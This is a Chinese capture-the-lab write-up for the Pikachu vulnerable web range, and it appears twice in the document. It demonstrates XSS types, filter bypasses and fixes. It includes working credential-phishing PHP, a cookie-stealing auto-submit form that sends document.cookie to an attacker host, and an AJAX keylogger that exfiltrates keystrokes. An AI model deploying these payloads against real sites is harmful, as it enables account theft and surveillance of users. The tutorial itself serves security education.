反射型XSS（GET）\n\n**漏洞挖掘**\n\n打开页面，是一个输入框。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321091305.png)\n\n随意输入内容，点击submit。可以发现我们输入的内容会被以GET的形式提交到服务器，并且会被放到响应页面中返回。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321091552.png)\n\n直接尝试最简单的测试Payload：`<script>alert(/xss/)</script>`（输入框有长度限制，直接在URL里输入）。我们输入的数据被当作JS代码执行，成功弹窗。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321092149.png)\n\n**漏洞利用(钓鱼攻击)**\n\n简单的重定向钓鱼：\n\n只需要将Payload改为：`<script>document.location.href=\"http://www.evil.com\"</script>`。\n\n`http://www.evil.com`为要重定向到的地址，即钓鱼页面。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321093958.png)\n\n接着诱导用户点击我们插入了Payload的链接，页面就会重定向到指定的钓鱼页面。\n\nBasic验证钓鱼：\n\n让用户访问我们插入了Payload的链接后，链接中的JS会被执行，执行结果就是请求fish.php，该文件会返回一个basic验证框。输入用户名密码后，会被发到我们的服务器。\n\nPayload：`<script src=http://localhost/fish.php></script>`\n\nfish.php内容：\n\n```php\n<?php\nerror_reporting(0);\n// var_dump($_SERVER);\nif ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {\n//发送认证框，并给出迷惑性的info\n    header('Content-type:text/html;charset=utf-8');\n    header(\"WWW-Authenticate: Basic realm='认证'\");\n    header('HTTP/1.0 401 Unauthorized');\n    echo 'Authorization Required.';\n    exit;\n} else if ((isset($_SERVER['PHP_AUTH_USER'])) && (isset($_SERVER['PHP_AUTH_PW']))){\n//将结果发送给搜集信息的后台,请将这里的IP地址修改为我们服务器的IP\n    header(\"Location: http://192.168.100.126/pkxss/xfish/xfish.php?username={$_SERVER[PHP_AUTH_USER]}\n    &password={$_SERVER[PHP_AUTH_PW]}\");\n}\n\n?>\n```\n\n诱导用户点击链接：`192.168.100.126/pikachu/vul/xss/xss_reflected_get.php?message=<script src=http://localhost/fish.php></script>&submit=submit`，弹出验证框：\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321140505.png)\n\n输入用户名密码点击确定后，我们服务器的访问日志中发现用户名密码：\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321140720.png)\n\n**漏洞分析**\n\n用户在URL中提交的message参数的值会被服务器获取，然后未经任何过滤就拼接到字符串`$html`中。\n\n接着会在返回给用户的页面中直接输出打印`$html`变量。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321095133.png)\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321095226.png)\n\n#### 0x01 反射型XSS（POST）\n\n**漏洞挖掘**\n\n打开页面，是一个登录页面，经过测试登录框不存在XSS，那么先进行登录，登录进去后会有一个输入框。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321113514.png)\n\n在输入框中输入`<script>alert(/xss/)</script>`进行测试。成功弹窗。\n\n**漏洞利用（窃取Cookie）**\n\n该漏洞类型属于POST型反射XSS，因为数据是通过POST方式提交的。\n\nPOST方式提交数据导致我们不能像GET方式那样，在URL中插入Payload诱导用户点击即可完成攻击。\n\nPOST型反射XSS漏洞利用（窃取Cookie）思路：\n\n实际上是CSRF配合XSS。\n\n在自己的服务器编写一个HTML文件，当访问该文件时，里面的JS会执行，执行效果是会自动提交POST数据。\n\n诱导用户点击我们编写的HTML文件的URL。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321115915.png)\n\n```html\n<html>\n<head>\n\t<script>\n\t\twindow.onload = function() {\n  \t\t\tdocument.getElementById(\"postsubmit\").click();\n\t\t\t}\n\t</script>\n</head>\n<body>\n\t<form method=\"post\" action=\"http://192.168.100.26/pikachu/vul/xss/xsspost/xss_reflected_post.php\">\n    <input id=\"xssr_in\" type=\"text\" name=\"message\" value=\n    \"<script>\n\t\tdocument.location = 'http://192.168.1.15/pkxss/xcookie/cookie.php?cookie=' + document.cookie;\n\t</script>\" />\n    <input id=\"postsubmit\" type=\"submit\" name=\"submit\" value=\"submit\" />\n\t</form>\n</body>\n</html>\n```\n\n查看服务器访问日志，发现Cookie被发回：\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321131526.png)\n\n**漏洞分析**\n\n与GET方式的差别在于提交数据的方式不一样而已，其他都是一样的。\n\n#### 0x02 存储型XSS\n\n**漏洞挖掘**\n\n打开页面，是一个留言的功能页面，随意输入然后提交，留言内容会被存储到数据库，然后输出到页面上。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321132302.png)\n\n输入`<script>alert(/xss/)</scipt>`并提交，JS被成功执行并弹窗。\n\n**漏洞利用（键盘记录）**\n\nJS Payload文件：\n\n该JS文件作用是监听键盘记录，并将键盘记录通过AJAX请求发送到我们的服务器。\n\n```javascript\nfunction createAjax(){\n    var request=false;\n    if(window.XMLHttpRequest){\n        request=new XMLHttpRequest();\n        if(request.overrideMimeType){\n            request.overrideMimeType(\"text/xml\");\n        }\n\n    }else if(window.ActiveXObject){\n\n        var versions=['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];\n        for(var i=0; i<versions.length; i++){\n            try{\n                request=new ActiveXObject(versions[i]);\n                if(request){\n                    return request;\n                }\n            }catch(e){\n                request=false;\n            }\n        }\n    }\n    return request;\n}\n\nvar ajax=null;\nvar xl=\"datax=\";\n\nfunction onkeypress() {\n    var realkey = String.fromCharCode(event.keyCode);\n    xl+=realkey;\n    show();\n}\n\ndocument.onkeypress = onkeypress;\n\nfunction show() {\n    ajax = createAjax();\n    ajax.onreadystatechange = function () {\n        if (ajax.readyState == 4) {\n            if (ajax.status == 200) {\n                var data = ajax.responseText;\n            } else {\n                alert(\"页面请求失败\");\n            }\n        }\n    }\n\n    var postdate = xl;\n    ajax.open(\"POST\", \"http://192.168.1.15/rserver.php\",true);\n    ajax.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\n    ajax.setRequestHeader(\"Content-length\", postdate.length);\n    ajax.setRequestHeader(\"Connection\", \"close\");\n    ajax.send(postdate);\n}\n```\n\n`rserver.php`是我们服务器上用于接收键盘记录的页面。这里不能再使用任意URL然后看访问日志的方式。因为AJAX请求默认是受同源策略影响的，不能跨域进行请求。解决跨域请求的一个方法是，要请求的目标服务器在响应消息的头部中使用`Access-Control-Allow-Origin:xxx.com`来允许某些域可以发起跨域请求。\n\n由于我们的目的就是要让它跨域发起请求发到我们的服务器上，所以我们用于接收键盘记录的页面编写为：\n\n```php\n<?php\n\n//设置允许被任意域跨域访问\nheader(\"Access-Control-Allow-Origin:*\");\n\n$data = $_POST['datax'];\n\n//保存到数据库\n.......\n\n?>\n```\n\n在留言处输入Payload`<script src=http://192.168.100.126/evil.js></script>`。之后在网页上按下的键都会被记录并发送到我们的接收页面。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321153844.png)\n\n**漏洞分析**\n\n用户的留言提交到服务器后，服务器只进行了防SQLi的转义就直接保存到数据库中。访问留言页面时，会从数据库中把留言记录查询出来直接输出打印在页面中。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321154523.png)\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321154819.png)\n\n#### 0x03 DOM XSS(输入框)\n\n**漏洞挖掘**\n\n打开页面，有一个输入框，点击`Click me`，会出现一个`<a>`标签，猜测应该是JS操作DOM添加了一个标签。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321160027.png)\n\n查看页面源代码，找到对应的JS，可以发现我们在输入框输入的数据会被直接拼接在`<a>`标签，然后将新创建的`<a>`标签直接插入HTML中：\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321160530.png)\n\n我们只要考虑闭合就可以随意插入JS代码。\n\n在输入框输入：`#' onmouseover=\"alert(/xss/)\">`，鼠标移动到`<a>`标签上，成功弹窗。\n\n该漏洞比较鸡肋。\n\n#### 0x04 DOM XSS（URL）\n\n**漏洞挖掘**\n\n打开页面后，操作与上一节一样，直接查看源代码，找到对应的JS。\n\n由JS代码可知我们可以在URL中的text参数构造payload，然后点击页面的`<a>`标签，我们的payload就会被插入到HTML中。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321162028.png)\n\n构造text参数的值为：` ' onclick=\"alert(/xss/)\">`\n\n先点击`有些事费尽心思.......`\n\n再点击`就让往事都随风......`\n\n**漏洞利用**\n\n该漏洞相对于上一节的DOM XSS漏洞要有危害得多，因为诱导用户点击链接就能完成攻击。\n\n漏洞利用参照前面几节，都是差不多的。\n\n#### 0x05 XSS盲打\n\nXSS盲打是指输入的数据不确定会被输出到哪个页面，只能尝试性使用Payload。\n\nXSS Blind 本质上也是存储型的XSS。\n\n**漏洞挖掘**\n\n打开页面，有输入框需要输入数据。输入的数据会被提交到服务器中，但是我们并不能确定我们输入的数据会被输出在哪个页面。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322090316.png)\n\n输入简单的payload测试：`<script>alert(/xss/)</script>`\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322090957.png)\n\n在本例中，我们输入的数据会被保存到数据库，然后输出在管理员后台页面中，当我们插入xss的payload，管理员登录后台管理时就会被攻击，危害相当大。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322091345.png)\n\n**漏洞分析**\n\n我们输入的数据未经过任何过滤处理就会被直接保存在服务器中。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322091944.png)\n\n后台页面会从数据库中读取数据，输出到页面。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322092322.png)\n\n#### 0x06 简单XSS过滤绕过\n\n**漏洞挖掘**\n\n打开页面，有一个输入框，输入一个XSS探针Payload来检测是否做了过滤，对什么做了过滤，XSS探针：\n\n> `\"'<script javascript onload src><a href></a>#$%^`\n\n输入探针后点击提交，然后查看页面源代码，确定过滤，发现`<`、`script`、`javascript`直接被过滤了。但是其他并没有被过滤。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322094644.png)\n\n使用`<a>`标签、`<img>`标签就可以绕过过滤。使用Payload：`<img src=x onerror=alert(1)>`，成功弹窗。\n\n**漏洞分析**\n\n采用了正则进行过滤，我们除了可以使用`<a>`、`<img>`登其他标签之外，还可以使用大写的`script`标签绕过。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322095504.png)\n\n#### 0x07 XSS htmlspecialchars()过滤绕过\n\n**漏洞挖掘**\n\n打开页面时一个登录框，继续同上一节的操作，插入XSS探针然后查看页面源代码，可以看到一些特殊字符被实体编码了：\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322100707.png)\n\n但可以注意到单引号并没有被转义，因此可以使用Payload：`' onmouseover=alert(1) '`\n\n**漏洞分析**\n\n分析源代码可知，后端使用`htmlspecialchars()`函数对用户的提交的数据进行了转义：\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322101307.png)\n\n但是存在一个问题，`htmlspecialchars()`函数默认是不对单引号进行转义的，要想连单引号一起转义，需要给函数传入参数`ENT_QUOTES`。\n\n`htmlspecialchars()`函数把预定义的字符转换为 HTML实体。\n\n> 预定义的字符是：\n>\n>  ```\n>   &  转为 `&amp;` \n>   \"  转为 `&quot;`\n>   '  转为 `&#039;` \n>   <  转为 `&lt;` \n>   >  转为 `&gt;`\n>  ```\n>\n> \n>\n> 可用的引号类型： \n>\n> ```\n> ENT_COMPAT - 默认。仅编码双引号。 \n> ENT_QUOTES - 编码双引号和单引号。 \n> ENT_NOQUOTES - 不编码任何引号。\n> ```\n\n**漏洞修复**\n\n使用`htmlspecialchars($GET['message'],ENT_QUOTES)`,而不是`htmlspecialchars($GET['message'])`。\n\n#### 0x08 XSS href输出\n\n**漏洞挖掘**\n\n打开页面继续使用XSS探针进行测试，可以发现特殊字符都被转义了，包括单引号。猜测使用了`htmlspecialchars($GET['message'],ENT_QUOTES)`对提交的数据进行转义。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322102841.png)\n\n但是，可以发现，我们输入的内容会被输出到`<a>`标签的`href`属性中。因此我们可以使用伪协议`javascript`进行绕过。\n\n输入Payload：`javascript:alert(1)`,点击超链接，成功弹窗。\n\n**漏洞分析**\n\n后台确实对提交的数据进行了转义，但却没考虑到`href`属性可以使用伪协议执行JS。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322103254.png)\n\n**漏洞修复**\n\n对输入的数据进行过滤，只允许http/https。\n\n对输出的数据进行转义，使用`htmlspecialchars($GET['message'],ENT_QUOTES)`。\n\n#### 0x09 XSS之输出到JS\n\n**漏洞挖掘**\n\n在页面输入内容，我们可以发现输入的数据会被输出在页面的JS代码之中，例如我们输入`whatever`：\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322104225.png)\n\n那么，我们只需要考虑闭合，即可构造XSS，输入Payload：`'</script><script>alert(1)</script>`，成功弹窗。\n\n**漏洞分析**\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322104702.png)\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322104739.png)\n\n**漏洞修复**\n\n这里有一个问题，由于输出点是`<script>`标签中，而在该标签中的内容HTML解析器是不会进行解码的，因此不能使用`htmlspecialchars()`函数进行转义，否则JS代码将会因为无法被解码而无法正常执行。具体原理参考文章：[XSS学习系列Chapter 1：浏览器解析HTML文档](https://sakuxa.com/2019/03/07/0x00-XSS%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E4%B9%8B%E8%A7%A3%E6%9E%90HTML%E6%96%87%E6%A1%A3/)\n\n所以解决方案应该是：在JS的输出点应该使用\\对特殊字符进行转义。\n\n### 三、总结\n\n- XSS漏洞会出现的点是复杂的、多种多样的。\n- XSS漏洞的本质是用户提交的数据被当作JS代码执行，因此挖掘XSS漏洞就是要想方设法让输入的数据被执行。\n- XSS漏洞的防范总体可以概括为“对输入进行过滤”和“对输出进行转义”，但是针对不同地方、不同功能点的防范方式及要考虑的方面也是不尽相同的。如0x08与0x09小节就是很好的例子。","source":"_posts/WEB漏洞靶场pikachu-xss.md","raw":"---\ntitle: WEB漏洞靶场Pikachu Writeup Chapter 2：XSS\ndate: 2019-03-21 09:10:05\ntags:\n\t- 靶场\n\t- WEB安全\n\t- XSS\ncategories: Pikachu\n---\n\n### 一、前面的话\n\n#### 0x00 XSS可以分为如下几种常见类型\n\n> - 反射性XSS\n> - 存储型XSS\n> - DOM型XSS\n\n#### 0x01 XSS漏洞的防范\n\n> 一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理。\n\n- 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;\n- 输出转义：根据输出点的位置对输出到前端的内容进行适当转义;\n\n<!-- more -->\n\n#### 0x02 XSS过滤的简单绕过\n\n> - 前端过滤绕过，抓包拦截改包即可。\n> - 大小写绕过：`<SciPt>alert(1)</sCIpt>`（JavaScript大小写敏感，但HTML大小写不敏感）\n> - 双写绕过：`<scr<script>ipt>alert(1)</scr</script>ipt>`\n> - 注释干扰：`<scri<!-- comment-->pt>alert(1)</sc<!-- comment -->ript>`\n> - 编码绕过：注意前端编码解码机制。\n\n不同类型的XSS利用方式都差不多，目标是让其执行JS代码，因此在下面的例子中每个点只用一种漏洞利用方式。\n\n### 二、XSS\n\n#### 0x00 反射型XSS（GET）\n\n**漏洞挖掘**\n\n打开页面，是一个输入框。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321091305.png)\n\n随意输入内容，点击submit。可以发现我们输入的内容会被以GET的形式提交到服务器，并且会被放到响应页面中返回。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321091552.png)\n\n直接尝试最简单的测试Payload：`<script>alert(/xss/)</script>`（输入框有长度限制，直接在URL里输入）。我们输入的数据被当作JS代码执行，成功弹窗。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321092149.png)\n\n**漏洞利用(钓鱼攻击)**\n\n简单的重定向钓鱼：\n\n只需要将Payload改为：`<script>document.location.href=\"http://www.evil.com\"</script>`。\n\n`http://www.evil.com`为要重定向到的地址，即钓鱼页面。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321093958.png)\n\n接着诱导用户点击我们插入了Payload的链接，页面就会重定向到指定的钓鱼页面。\n\nBasic验证钓鱼：\n\n让用户访问我们插入了Payload的链接后，链接中的JS会被执行，执行结果就是请求fish.php，该文件会返回一个basic验证框。输入用户名密码后，会被发到我们的服务器。\n\nPayload：`<script src=http://localhost/fish.php></script>`\n\nfish.php内容：\n\n```php\n<?php\nerror_reporting(0);\n// var_dump($_SERVER);\nif ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {\n//发送认证框，并给出迷惑性的info\n    header('Content-type:text/html;charset=utf-8');\n    header(\"WWW-Authenticate: Basic realm='认证'\");\n    header('HTTP/1.0 401 Unauthorized');\n    echo 'Authorization Required.';\n    exit;\n} else if ((isset($_SERVER['PHP_AUTH_USER'])) && (isset($_SERVER['PHP_AUTH_PW']))){\n//将结果发送给搜集信息的后台,请将这里的IP地址修改为我们服务器的IP\n    header(\"Location: http://192.168.100.126/pkxss/xfish/xfish.php?username={$_SERVER[PHP_AUTH_USER]}\n    &password={$_SERVER[PHP_AUTH_PW]}\");\n}\n\n?>\n```\n\n诱导用户点击链接：`192.168.100.126/pikachu/vul/xss/xss_reflected_get.php?message=<script src=http://localhost/fish.php></script>&submit=submit`，弹出验证框：\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321140505.png)\n\n输入用户名密码点击确定后，我们服务器的访问日志中发现用户名密码：\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321140720.png)\n\n**漏洞分析**\n\n用户在URL中提交的message参数的值会被服务器获取，然后未经任何过滤就拼接到字符串`$html`中。\n\n接着会在返回给用户的页面中直接输出打印`$html`变量。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321095133.png)\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321095226.png)\n\n#### 0x01 反射型XSS（POST）\n\n**漏洞挖掘**\n\n打开页面，是一个登录页面，经过测试登录框不存在XSS，那么先进行登录，登录进去后会有一个输入框。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321113514.png)\n\n在输入框中输入`<script>alert(/xss/)</script>`进行测试。成功弹窗。\n\n**漏洞利用（窃取Cookie）**\n\n该漏洞类型属于POST型反射XSS，因为数据是通过POST方式提交的。\n\nPOST方式提交数据导致我们不能像GET方式那样，在URL中插入Payload诱导用户点击即可完成攻击。\n\nPOST型反射XSS漏洞利用（窃取Cookie）思路：\n\n实际上是CSRF配合XSS。\n\n在自己的服务器编写一个HTML文件，当访问该文件时，里面的JS会执行，执行效果是会自动提交POST数据。\n\n诱导用户点击我们编写的HTML文件的URL。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321115915.png)\n\n```html\n<html>\n<head>\n\t<script>\n\t\twindow.onload = function() {\n  \t\t\tdocument.getElementById(\"postsubmit\").click();\n\t\t\t}\n\t</script>\n</head>\n<body>\n\t<form method=\"post\" action=\"http://192.168.100.26/pikachu/vul/xss/xsspost/xss_reflected_post.php\">\n    <input id=\"xssr_in\" type=\"text\" name=\"message\" value=\n    \"<script>\n\t\tdocument.location = 'http://192.168.1.15/pkxss/xcookie/cookie.php?cookie=' + document.cookie;\n\t</script>\" />\n    <input id=\"postsubmit\" type=\"submit\" name=\"submit\" value=\"submit\" />\n\t</form>\n</body>\n</html>\n```\n\n查看服务器访问日志，发现Cookie被发回：\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321131526.png)\n\n**漏洞分析**\n\n与GET方式的差别在于提交数据的方式不一样而已，其他都是一样的。\n\n#### 0x02 存储型XSS\n\n**漏洞挖掘**\n\n打开页面，是一个留言的功能页面，随意输入然后提交，留言内容会被存储到数据库，然后输出到页面上。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321132302.png)\n\n输入`<script>alert(/xss/)</scipt>`并提交，JS被成功执行并弹窗。\n\n**漏洞利用（键盘记录）**\n\nJS Payload文件：\n\n该JS文件作用是监听键盘记录，并将键盘记录通过AJAX请求发送到我们的服务器。\n\n```javascript\nfunction createAjax(){\n    var request=false;\n    if(window.XMLHttpRequest){\n        request=new XMLHttpRequest();\n        if(request.overrideMimeType){\n            request.overrideMimeType(\"text/xml\");\n        }\n\n    }else if(window.ActiveXObject){\n\n        var versions=['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];\n        for(var i=0; i<versions.length; i++){\n            try{\n                request=new ActiveXObject(versions[i]);\n                if(request){\n                    return request;\n                }\n            }catch(e){\n                request=false;\n            }\n        }\n    }\n    return request;\n}\n\nvar ajax=null;\nvar xl=\"datax=\";\n\nfunction onkeypress() {\n    var realkey = String.fromCharCode(event.keyCode);\n    xl+=realkey;\n    show();\n}\n\ndocument.onkeypress = onkeypress;\n\nfunction show() {\n    ajax = createAjax();\n    ajax.onreadystatechange = function () {\n        if (ajax.readyState == 4) {\n            if (ajax.status == 200) {\n                var data = ajax.responseText;\n            } else {\n                alert(\"页面请求失败\");\n            }\n        }\n    }\n\n    var postdate = xl;\n    ajax.open(\"POST\", \"http://192.168.1.15/rserver.php\",true);\n    ajax.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\n    ajax.setRequestHeader(\"Content-length\", postdate.length);\n    ajax.setRequestHeader(\"Connection\", \"close\");\n    ajax.send(postdate);\n}\n```\n\n`rserver.php`是我们服务器上用于接收键盘记录的页面。这里不能再使用任意URL然后看访问日志的方式。因为AJAX请求默认是受同源策略影响的，不能跨域进行请求。解决跨域请求的一个方法是，要请求的目标服务器在响应消息的头部中使用`Access-Control-Allow-Origin:xxx.com`来允许某些域可以发起跨域请求。\n\n由于我们的目的就是要让它跨域发起请求发到我们的服务器上，所以我们用于接收键盘记录的页面编写为：\n\n```php\n<?php\n\n//设置允许被任意域跨域访问\nheader(\"Access-Control-Allow-Origin:*\");\n\n$data = $_POST['datax'];\n\n//保存到数据库\n.......\n\n?>\n```\n\n在留言处输入Payload`<script src=http://192.168.100.126/evil.js></script>`。之后在网页上按下的键都会被记录并发送到我们的接收页面。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321153844.png)\n\n**漏洞分析**\n\n用户的留言提交到服务器后，服务器只进行了防SQLi的转义就直接保存到数据库中。访问留言页面时，会从数据库中把留言记录查询出来直接输出打印在页面中。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321154523.png)\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321154819.png)\n\n#### 0x03 DOM XSS(输入框)\n\n**漏洞挖掘**\n\n打开页面，有一个输入框，点击`Click me`，会出现一个`<a>`标签，猜测应该是JS操作DOM添加了一个标签。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321160027.png)\n\n查看页面源代码，找到对应的JS，可以发现我们在输入框输入的数据会被直接拼接在`<a>`标签，然后将新创建的`<a>`标签直接插入HTML中：\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321160530.png)\n\n我们只要考虑闭合就可以随意插入JS代码。\n\n在输入框输入：`#' onmouseover=\"alert(/xss/)\">`，鼠标移动到`<a>`标签上，成功弹窗。\n\n该漏洞比较鸡肋。\n\n#### 0x04 DOM XSS（URL）\n\n**漏洞挖掘**\n\n打开页面后，操作与上一节一样，直接查看源代码，找到对应的JS。\n\n由JS代码可知我们可以在URL中的text参数构造payload，然后点击页面的`<a>`标签，我们的payload就会被插入到HTML中。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190321162028.png)\n\n构造text参数的值为：` ' onclick=\"alert(/xss/)\">`\n\n先点击`有些事费尽心思.......`\n\n再点击`就让往事都随风......`\n\n**漏洞利用**\n\n该漏洞相对于上一节的DOM XSS漏洞要有危害得多，因为诱导用户点击链接就能完成攻击。\n\n漏洞利用参照前面几节，都是差不多的。\n\n#### 0x05 XSS盲打\n\nXSS盲打是指输入的数据不确定会被输出到哪个页面，只能尝试性使用Payload。\n\nXSS Blind 本质上也是存储型的XSS。\n\n**漏洞挖掘**\n\n打开页面，有输入框需要输入数据。输入的数据会被提交到服务器中，但是我们并不能确定我们输入的数据会被输出在哪个页面。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322090316.png)\n\n输入简单的payload测试：`<script>alert(/xss/)</script>`\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322090957.png)\n\n在本例中，我们输入的数据会被保存到数据库，然后输出在管理员后台页面中，当我们插入xss的payload，管理员登录后台管理时就会被攻击，危害相当大。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322091345.png)\n\n**漏洞分析**\n\n我们输入的数据未经过任何过滤处理就会被直接保存在服务器中。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322091944.png)\n\n后台页面会从数据库中读取数据，输出到页面。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322092322.png)\n\n#### 0x06 简单XSS过滤绕过\n\n**漏洞挖掘**\n\n打开页面，有一个输入框，输入一个XSS探针Payload来检测是否做了过滤，对什么做了过滤，XSS探针：\n\n> `\"'<script javascript onload src><a href></a>#$%^`\n\n输入探针后点击提交，然后查看页面源代码，确定过滤，发现`<`、`script`、`javascript`直接被过滤了。但是其他并没有被过滤。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322094644.png)\n\n使用`<a>`标签、`<img>`标签就可以绕过过滤。使用Payload：`<img src=x onerror=alert(1)>`，成功弹窗。\n\n**漏洞分析**\n\n采用了正则进行过滤，我们除了可以使用`<a>`、`<img>`登其他标签之外，还可以使用大写的`script`标签绕过。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322095504.png)\n\n#### 0x07 XSS htmlspecialchars()过滤绕过\n\n**漏洞挖掘**\n\n打开页面时一个登录框，继续同上一节的操作，插入XSS探针然后查看页面源代码，可以看到一些特殊字符被实体编码了：\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322100707.png)\n\n但可以注意到单引号并没有被转义，因此可以使用Payload：`' onmouseover=alert(1) '`\n\n**漏洞分析**\n\n分析源代码可知，后端使用`htmlspecialchars()`函数对用户的提交的数据进行了转义：\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322101307.png)\n\n但是存在一个问题，`htmlspecialchars()`函数默认是不对单引号进行转义的，要想连单引号一起转义，需要给函数传入参数`ENT_QUOTES`。\n\n`htmlspecialchars()`函数把预定义的字符转换为 HTML实体。\n\n> 预定义的字符是：\n>\n>  ```\n>   &  转为 `&amp;` \n>   \"  转为 `&quot;`\n>   '  转为 `&#039;` \n>   <  转为 `&lt;` \n>   >  转为 `&gt;`\n>  ```\n>\n> \n>\n> 可用的引号类型： \n>\n> ```\n> ENT_COMPAT - 默认。仅编码双引号。 \n> ENT_QUOTES - 编码双引号和单引号。 \n> ENT_NOQUOTES - 不编码任何引号。\n> ```\n\n**漏洞修复**\n\n使用`htmlspecialchars($GET['message'],ENT_QUOTES)`,而不是`htmlspecialchars($GET['message'])`。\n\n#### 0x08 XSS href输出\n\n**漏洞挖掘**\n\n打开页面继续使用XSS探针进行测试，可以发现特殊字符都被转义了，包括单引号。猜测使用了`htmlspecialchars($GET['message'],ENT_QUOTES)`对提交的数据进行转义。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322102841.png)\n\n但是，可以发现，我们输入的内容会被输出到`<a>`标签的`href`属性中。因此我们可以使用伪协议`javascript`进行绕过。\n\n输入Payload：`javascript:alert(1)`,点击超链接，成功弹窗。\n\n**漏洞分析**\n\n后台确实对提交的数据进行了转义，但却没考虑到`href`属性可以使用伪协议执行JS。\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322103254.png)\n\n**漏洞修复**\n\n对输入的数据进行过滤，只允许http/https。\n\n对输出的数据进行转义，使用`htmlspecialchars($GET['message'],ENT_QUOTES)`。\n\n#### 0x09 XSS之输出到JS\n\n**漏洞挖掘**\n\n在页面输入内容，我们可以发现输入的数据会被输出在页面的JS代码之中，例如我们输入`whatever`：\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322104225.png)\n\n那么，我们只需要考虑闭合，即可构造XSS，输入Payload：`'</script><script>alert(1)</script>`，成功弹窗。\n\n**漏洞分析**\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322104702.png)\n\n![](WEB漏洞靶场pikachu-xss\\QQ截图20190322104739.png)\n\n**漏洞修复**\n\n这里有一个问题，由于输出点是`<script>`标签中，而在该标签中的内容HTML解析器是不会进行解码的，因此不能使用`htmlspecialchars()`函数进行转义，否则JS代码将会因为无法被解码而无法正常执行。具体原理参考文章：[XSS学习系列Chapter 1：浏览器解析HTML文档](https://sakuxa.com/2019/03/07/0x00-XSS%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E4%B9%8B%E8%A7%A3%E6%9E%90HTML%E6%96%87%E6%A1%A3/)\n\n所以解决方案应该是：在JS的输出点应该使用\\对特殊字符进行转义。\n\n### 三、总结\n\n- XSS漏洞会出现的点是复杂的、多种多样的。\n- XSS漏洞的本质是用户提交的数据被当作JS代码执行，因此挖掘XSS漏洞就是要想方设法让输入的数据被执行。\n- 